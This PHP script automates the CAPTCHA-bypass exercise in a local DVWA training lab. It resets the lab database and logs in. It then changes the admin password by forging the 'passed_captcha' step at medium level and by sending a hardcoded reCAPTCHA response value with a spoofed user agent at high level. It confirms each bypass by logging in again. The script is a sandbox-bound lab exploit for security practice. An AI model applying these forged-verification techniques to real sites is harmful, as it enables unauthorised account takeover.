<?php

declare(strict_types=1);

$base = 'http://127.0.0.1';
$user = getenv('DVWA_LAB_USER') ?: 'admin';
$currentPassword = getenv('DVWA_LAB_CURRENT_PASSWORD') ?: '';
$modes = array_filter(array_map('trim', explode(',', getenv('DVWA_LAB_MODES') ?: 'medium,high')));
if ($currentPassword === '' || !$modes) {
    fwrite(STDERR, "Set sandbox-only current password and at least one mode.\n");
    exit(2);
}

function pageRequest($c, string $url, ?array $fields = null): array
{
    curl_setopt($c, CURLOPT_URL, $url);
    curl_setopt($c, CURLOPT_POST, $fields !== null);
    curl_setopt($c, CURLOPT_POSTFIELDS, $fields === null ? null : http_build_query($fields));
    $body = curl_exec($c);
    if ($body === false) {
        throw new RuntimeException('HTTP request failed: ' . curl_error($c));
    }
    return [$body, (int)curl_getinfo($c, CURLINFO_HTTP_CODE), (string)curl_getinfo($c, CURLINFO_EFFECTIVE_URL)];
}

function tokenFrom(string $body): string
{
    if (!preg_match('/<input\\b[^>]*name=[\'\"]user_token[\'\"][^>]*value=[\'\"]([^\'\"]+)/i', $body, $m)) {
        throw new RuntimeException('user_token input missing');
    }
    return html_entity_decode($m[1], ENT_QUOTES | ENT_HTML5, 'UTF-8');
}

function authenticatedSession(string $base, string $user, string $password): string
{
    $jar = tempnam(sys_get_temp_dir(), 'dvwa-captcha-');
    $c = curl_init();
    curl_setopt_array($c, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_MAXREDIRS => 3,
        CURLOPT_CONNECTTIMEOUT => 4,
        CURLOPT_TIMEOUT => 15,
        CURLOPT_COOKIEFILE => $jar,
        CURLOPT_COOKIEJAR => $jar,
        CURLOPT_USERAGENT => 'DVWA-isolated-level-test/1.0',
    ]);
    try {
        [$loginPage] = pageRequest($c, $base . '/login.php');
        $token = tokenFrom($loginPage);
        [$body, $status, $url] = pageRequest($c, $base . '/login.php', [
            'username' => $user,
            'password' => $password,
            'Login' => 'Login',
            'user_token' => $token,
        ]);
        if ($status !== 200 || stripos($body, 'Login failed') !== false || str_contains($url, 'login.php')) {
            throw new RuntimeException('Login failed; no vulnerability request sent');
        }
        foreach (curl_getinfo($c, CURLINFO_COOKIELIST) ?: [] as $line) {
            $parts = explode("\t", $line);
            if (count($parts) >= 7 && $parts[5] === 'PHPSESSID' && preg_match('/^[A-Za-z0-9,-]+$/', $parts[6])) {
                return $parts[6];
            }
        }
        throw new RuntimeException('Authenticated session cookie unavailable');
    } finally {
        @unlink($jar);
    }
}

$setupJar = tempnam(sys_get_temp_dir(), 'dvwa-captcha-setup-');
$setupClient = curl_init();
curl_setopt_array($setupClient, [
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_FOLLOWLOCATION => true,
    CURLOPT_MAXREDIRS => 3,
    CURLOPT_CONNECTTIMEOUT => 4,
    CURLOPT_TIMEOUT => 15,
    CURLOPT_COOKIEFILE => $setupJar,
    CURLOPT_COOKIEJAR => $setupJar,
    CURLOPT_USERAGENT => 'DVWA-isolated-level-test/1.0',
]);
try {
    [$setupPage] = pageRequest($setupClient, $base . '/setup.php');
    [, $setupStatus] = pageRequest($setupClient, $base . '/setup.php', [
        'create_db' => 'Create / Reset Database',
        'user_token' => tokenFrom($setupPage),
    ]);
    if ($setupStatus !== 200) {
        throw new RuntimeException('Isolated sandbox database setup failed');
    }
    echo "isolated sandbox database initialized\n";
} finally {
    @unlink($setupJar);
}

foreach ($modes as $mode) {
    if (!in_array($mode, ['medium', 'high'], true)) {
        throw new RuntimeException('Only medium and high are supported here');
    }
    $sessionId = authenticatedSession($base, $user, $currentPassword);
    $nextPassword = 'SandboxOnly-' . $mode . '-' . bin2hex(random_bytes(8));
    $fields = [
        'password_new' => $nextPassword,
        'password_conf' => $nextPassword,
        'Change' => 'Change',
    ];
    if ($mode === 'medium') {
        $fields['step'] = '2';
        $fields['passed_captcha'] = 'true';
    } else {
        $fields['g-recaptcha-response'] = 'hidd3n_valu3';
    }

    $c = curl_init($base . '/vulnerabilities/captcha/');
    curl_setopt_array($c, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_MAXREDIRS => 3,
        CURLOPT_CONNECTTIMEOUT => 4,
        CURLOPT_TIMEOUT => 15,
        CURLOPT_COOKIE => 'PHPSESSID=' . $sessionId . '; security=' . $mode,
        CURLOPT_USERAGENT => $mode === 'high' ? 'reCAPTCHA' : 'DVWA-isolated-level-test/1.0',
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => http_build_query($fields),
    ]);
    $body = curl_exec($c);
    if ($body === false) {
        $error = curl_error($c);
        throw new RuntimeException($mode . ' request failed: ' . $error);
    }
    $status = (int)curl_getinfo($c, CURLINFO_HTTP_CODE);
    echo strtoupper($mode) . " request: HTTP {$status}\n";

    if (!authenticatedSession($base, $user, $nextPassword)) {
        throw new RuntimeException(strtoupper($mode) . ' bypass not confirmed');
    }
    echo strtoupper($mode) . "_CAPTCHA_BYPASS_CONFIRMED by login with changed password\n";
    $currentPassword = $nextPassword;
}
